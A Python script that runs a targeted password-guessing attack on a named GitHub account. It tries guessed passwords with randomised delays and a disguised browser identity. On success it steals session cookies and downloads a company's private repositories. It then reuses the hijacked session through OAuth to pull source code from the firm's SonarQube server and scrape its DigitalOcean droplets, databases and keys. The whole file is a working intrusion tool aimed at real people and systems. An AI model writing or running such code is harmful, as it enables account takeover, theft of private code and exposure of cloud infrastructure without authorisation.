#!/usr/bin/env python3
"""ct49 iGHSPRAY: owner GitHub (eazylaykzy) password probe on a clean GHA egress.
Read-only. On HIT: GitHub identity/org/repo dump + zipball of backend repos + SonarQube
GitHub-OAuth source dump + DigitalOcean 'Sign in with GitHub' read-only scrape.
"""
import json, os, re, subprocess, sys, time, random

CANDS = ["Adelekeadenijio@2024", "adeleke@2024", "Adeniji@2024", "AdelekeAdeniji@2024"]
LOGIN = os.environ.get("GH_LOGIN", "eazylaykzy")
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
      "Chrome/131.0.0.0 Safari/537.36")
OUT = "out2"
os.makedirs(OUT + "/dump", exist_ok=True)
try:
    import requests
except Exception:
    subprocess.run([sys.executable, "-m", "pip", "install", "--quiet", "requests"])
    import requests


def log(*a):
    print(*a, flush=True)


def egress():
    out = {}
    for u in ("https://ifconfig.me/ip", "https://api.ipify.org", "https://ipinfo.io/json"):
        try:
            out[u] = requests.get(u, timeout=15).text[:300]
        except Exception as e:
            out[u] = "ERR " + str(e)[:80]
    return out


def new_session():
    s = requests.Session()
    s.headers.update({"User-Agent": UA, "Accept-Language": "en-US,en;q=0.9",
                      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"})
    return s


def classify_login(r2):
    rec = {"status": r2.status_code, "location": r2.headers.get("Location"),
           "setcookie": [c.name for c in r2.cookies]}
    if r2.status_code in (301, 302, 303):
        loc = r2.headers.get("Location", "")
        if "two-factor" in loc:
            rec["verdict"] = "2FA"
        elif "login/oauth" in loc or "session" in loc:
            rec["verdict"] = "REDIRECT:" + loc[:120]
        else:
            rec["verdict"] = "SUCCESS"
        return rec
    t = r2.text
    flags = []
    for key in ["Incorrect username or password", "There have been several failed",
                "verify your account", "captcha", "suspended", "rate limit", "too many"]:
        if key.lower() in t.lower():
            flags.append(key)
    rec["flags"] = flags
    fm = re.findall(r'class="flash[^"]*"[^>]*>(.*?)</div>', t, re.S)
    rec["flash"] = [re.sub(r"<[^>]+>", "", x).strip()[:200] for x in fm[:3]]
    tl = t.lower()
    if any("There have been several failed" in f for f in flags):
        rec["verdict"] = "CAPTCHA"
    elif any("Incorrect username or password" in f for f in flags):
        rec["verdict"] = "WRONG_PASSWORD"
    elif "you can\u2019t perform that action" in tl or "you can't perform that action" in tl:
        rec["verdict"] = "CAPTCHA"
    elif any("suspended" in f.lower() for f in flags):
        rec["verdict"] = "SUSPENDED"
    else:
        rec["verdict"] = "UNKNOWN"
    return rec


def jget(s, url, timeout=45, **kw):
    try:
        r = s.get(url, timeout=timeout, **kw)
        return {"status": r.status_code, "len": len(r.content),
                "head": r.text[:400] if "json" in (r.headers.get("Content-Type") or "") else r.text[:200]}
    except Exception as e:
        return {"err": f"{type(e).__name__}: {str(e)[:160]}"}


def github_dump(s):
    out = {}
    for u in ("https://github.com/", "https://github.com/settings/profile",
              "https://api.github.com/user", "https://api.github.com/user/orgs",
              "https://api.github.com/user/memberships/orgs/Cardtonic-Technologies",
              "https://api.github.com/orgs/Cardtonic-Technologies/repos?type=all&per_page=100"):
        out[u] = jget(s, u)
    try:
        r = s.get("https://github.com/orgs/Cardtonic-Technologies/repositories?type=all",
                  timeout=45)
        out["org_repos_html"] = {"status": r.status_code, "len": len(r.content)}
        slugs = sorted(set(re.findall(r'/Cardtonic-Technologies/([A-Za-z0-9._-]+)', r.text)))
        out["org_repo_slugs"] = slugs
    except Exception as e:
        out["org_repos_html"] = {"err": str(e)[:160]}
        slugs = []
    json.dump(out, open(OUT + "/github.json", "w"), indent=1)
    os.makedirs(OUT + "/repos", exist_ok=True)
    want = re.compile(r"(api|server|backend|core|pay|wallet|ledger|recon|worker|bull|tonic|admin|dashboard|web)", re.I)
    picks = [x for x in slugs if want.search(x)][:5]
    for repo in picks:
        for br in ("main", "master"):
            for url in (f"https://github.com/Cardtonic-Technologies/{repo}/archive/refs/heads/{br}.zip",
                        f"https://api.github.com/repos/Cardtonic-Technologies/{repo}/zipball/{br}"):
                try:
                    r = s.get(url, timeout=180, stream=True, allow_redirects=True)
                    if r.status_code != 200:
                        continue
                    fn = OUT + "/repos/" + repo + "_" + br + ".zip"
                    n = 0
                    with open(fn, "wb") as f:
                        for chunk in r.iter_content(65536):
                            f.write(chunk); n += len(chunk)
                            if n > 40 * 1024 * 1024:
                                break
                    log("[zip]", repo, br, n, url[:80])
                    break
                except Exception as e:
                    log("[zip-err]", repo, br, str(e)[:100])
            if any(f.startswith(repo + "_") for f in os.listdir(OUT + "/repos")):
                break
    out["zipped"] = sorted(os.listdir(OUT + "/repos"))
    json.dump(out, open(OUT + "/github.json", "w"), indent=1)
    return out


def sonar_dump(s):
    out = {"steps": []}
    try:
        r = s.get("https://sonarci.cardtonic.com/sessions/init/github?return_to=%2F",
                  allow_redirects=True, timeout=40)
        out["steps"].append({"url": "sessions/init/github", "final": r.url[:200],
                             "status": r.status_code, "len": len(r.text)})
        if "/login/oauth/authorize" in r.url:
            m = re.search(r'name="authenticity_token" value="([^"]+)"', r.text)
            if m:
                data = {"authenticity_token": m.group(1).replace("&amp;", "&"), "authorize": "1"}
                for k in ("client_id", "redirect_uri", "scope", "state"):
                    mm = re.search(r'name="%s" value="([^"]*)"' % k, r.text)
                    if mm:
                        data[k] = mm.group(1).replace("&amp;", "&")
                r2 = s.post("https://github.com/login/oauth/authorize", data=data,
                            allow_redirects=True, timeout=40)
                out["steps"].append({"url": "oauth/authorize POST", "final": r2.url[:200],
                                     "status": r2.status_code, "len": len(r2.text)})
        v = s.get("https://sonarci.cardtonic.com/api/authentication/validate", timeout=40)
        out["validate"] = {"status": v.status_code, "body": v.text[:300]}
        comp = s.get("https://sonarci.cardtonic.com/api/components/search?qualifiers=TRK&ps=500",
                     timeout=60)
        out["components_status"] = comp.status_code
        keys = []
        try:
            keys = [c["key"] for c in comp.json().get("components", [])]
        except Exception:
            out["components_body"] = comp.text[:400]
        out["keys"] = keys[:25]
        os.makedirs(OUT + "/sonar_src", exist_ok=True)
        total = 0
        for k in out["keys"]:
            try:
                rr = s.get("https://sonarci.cardtonic.com/api/sources/raw",
                           params={"key": k}, timeout=90)
                fn = OUT + "/sonar_src/" + re.sub(r"[^A-Za-z0-9._-]", "_", k) + ".txt"
                open(fn, "w").write(rr.text)
                total += len(rr.text)
                log("[sonar]", k, rr.status_code, len(rr.text))
            except Exception as e:
                log("[sonar-err]", k, str(e)[:120])
        out["sources_bytes"] = total
    except Exception as e:
        out["err"] = f"{type(e).__name__}: {str(e)[:300]}"
    return out


def do_dump(s):
    """Best effort: 'Sign in with GitHub' on cloud.digitalocean.com, then READ-ONLY api scrape."""
    out = {"steps": []}
    try:
        r = s.get("https://cloud.digitalocean.com/login", timeout=45, allow_redirects=True)
        out["steps"].append({"url": "login", "final": r.url[:160], "status": r.status_code,
                             "len": len(r.text)})
        if "github.com" in r.url and "/login/oauth/authorize" in r.url:
            r = s.get("https://cloud.digitalocean.com/auth/github", timeout=45, allow_redirects=True)
            out["steps"].append({"url": "auth/github", "final": r.url[:160],
                                 "status": r.status_code, "len": len(r.text)})
        if "/login/oauth/authorize" in r.url:
            m = re.search(r'name="authenticity_token" value="([^"]+)"', r.text)
            if m:
                data = {"authenticity_token": m.group(1).replace("&amp;", "&"), "authorize": "1"}
                for k in ("client_id", "redirect_uri", "scope", "state"):
                    mm = re.search(r'name="%s" value="([^"]*)"' % k, r.text)
                    if mm:
                        data[k] = mm.group(1).replace("&amp;", "&")
                r2 = s.post("https://github.com/login/oauth/authorize", data=data,
                            allow_redirects=True, timeout=60)
                out["steps"].append({"url": "do oauth POST", "final": r2.url[:160],
                                     "status": r2.status_code, "len": len(r2.text)})
        for path in ("account", "droplets?per_page=100", "databases?per_page=100",
                     "kubernetes/clusters?per_page=100", "spaces", "account/keys?per_page=100",
                     "regions?per_page=100"):
            u = "https://cloud.digitalocean.com/api/v2/" + path
            rec = jget(s, u, timeout=60)
            rec["text"] = (rec.pop("head", "") or "")[:8000]
            out[path] = rec
        if not (out.get("droplets?per_page=100", {}).get("status") == 200):
            u = "https://api.digitalocean.com/v2/droplets?per_page=100"
            rec = jget(s, u, timeout=60)
            rec["text"] = (rec.pop("head", "") or "")[:8000]
            out["api_droplets"] = rec
        home = s.get("https://cloud.digitalocean.com/", timeout=45)
        out["home"] = {"status": home.status_code, "len": len(home.content),
                       "text": re.sub(r"<[^>]+>", " ", home.text)[:1200]}
    except Exception as e:
        out["err"] = f"{type(e).__name__}: {str(e)[:300]}"
    return out


def main():
    res = {"login": LOGIN, "egress": egress(), "attempts": [], "verdict": None, "session": None}
    log("EGRESS", json.dumps(res["egress"])[:300])
    for pw in CANDS:
        s = new_session()
        rec = {"pw": pw}
        try:
            r = s.get("https://github.com/login", timeout=30)
            m = re.search(r'name="authenticity_token" value="([^"]+)"', r.text)
            if not m:
                rec["verdict"] = "NO_TOKEN"
                res["attempts"].append(rec)
                break
            tok = m.group(1).replace("&amp;", "&")
            time.sleep(random.uniform(3, 6))
            r2 = s.post("https://github.com/session",
                        data={"commit": "Sign in", "authenticity_token": tok, "login": LOGIN,
                              "password": pw, "webauthn-conditional": "undefined",
                              "javascript-support": "true", "webauthn-support": "supported"},
                        allow_redirects=False, timeout=40)
            rec.update(classify_login(r2))
        except Exception as e:
            rec["verdict"] = "ERR"
            rec["err"] = f"{type(e).__name__}:{str(e)}"[:200]
        res["attempts"].append(rec)
        log("=== gh", pw, "->", rec.get("verdict"), rec.get("flags"))
        if rec.get("verdict") in ("SUCCESS", "2FA"):
            res["verdict"] = rec["verdict"]
            try:
                res["cookies"] = s.cookies.get_dict()
            except Exception:
                pass
            if rec.get("verdict") == "SUCCESS":
                # verify the session really is logged in
                try:
                    h = s.get("https://github.com/", timeout=40)
                    res["logged_in_html"] = ("Sign out" in h.text) or ("/logout" in h.text)
                except Exception:
                    res["logged_in_html"] = None
                res["github"] = github_dump(s)
                res["sonar"] = sonar_dump(s)
                res["do"] = do_dump(s)
            break
        if rec.get("verdict") == "CAPTCHA" and pw != CANDS[-1]:
            res["stopped_at"] = pw
            break
        time.sleep(random.uniform(3, 7))
    if res["verdict"] is None:
        res["verdict"] = res["attempts"][-1].get("verdict") if res["attempts"] else "NO_ATTEMPTS"
    json.dump(res, open(OUT + "/results.json", "w"), indent=1)
    open(OUT + "/summary.txt", "w").write(json.dumps({
        "login": LOGIN, "egress": res["egress"], "verdict": res["verdict"],
        "attempts": [[a.get("pw"), a.get("verdict"), a.get("flags")] for a in res["attempts"]],
        "sonar_keys": (res.get("sonar") or {}).get("keys"),
        "org_repo_slugs": (res.get("github") or {}).get("org_repo_slugs"),
    }, indent=1)[:60000])
    log("SUMMARY", json.dumps({"verdict": res["verdict"],
        "attempts": [[a.get("pw"), a.get("verdict")] for a in res["attempts"]]}, ensure_ascii=False))


main()
